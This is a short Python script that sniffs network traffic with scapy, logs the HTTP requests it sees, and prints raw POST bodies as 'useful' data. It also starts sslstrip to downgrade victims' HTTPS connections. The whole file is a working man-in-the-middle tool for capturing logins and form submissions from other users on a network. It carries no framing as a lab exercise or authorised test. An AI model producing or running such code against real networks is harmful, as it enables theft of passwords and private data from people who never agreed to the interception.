from scapy.all import *
from scapy.layers.http import HTTPRequest
from colorama import init, Fore
import os
import socket
import threading

# Initialize colorama for colored output
init()

# Define colors for output
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET

def is_port_in_use(port):
    """Check if a port is in use."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('127.0.0.1', port)) == 0

def process_packet(packet):
    """This function is executed whenever a packet is sniffed."""
    if packet.haslayer(HTTPRequest):
        # If this packet is an HTTP Request
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        ip = packet[IP].src
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")

        if packet.haslayer(Raw) and method == "POST":
            # If the packet has raw data and the method is POST
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")

def start_sslstrip():
    """Start SSLstrip to downgrade HTTPS traffic."""
    if is_port_in_use(10000):
        print(f"{RED}[!] Port 10000 is already in use. Please choose a different port.{RESET}")
        return
    try:
        os.system("sslstrip -l 10000")  # Start SSLstrip on port 10000
    except Exception as e:
        print(f"{RED}[!] Error starting SSLstrip: {e}{RESET}")

def sniff_packets(iface=None):
    """Sniff packets on the specified interface."""
    if iface:
        sniff(filter="tcp port 80 or tcp port 443", prn=process_packet, iface=iface, store=False)
    else:
        sniff(filter="tcp port 80 or tcp port 443", prn=process_packet, store=False)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP and HTTPS Packet Sniffer")
    parser.add_argument("-i", "--iface", help="Interface to use, default is Scapy's default interface")
    args = parser.parse_args()
    iface = args.iface

    # Start SSLstrip in a separate thread
    sslstrip_thread = threading.Thread(target=start_sslstrip)
    sslstrip_thread.start()
    
    # Start sniffing packets
    sniff_packets(iface)
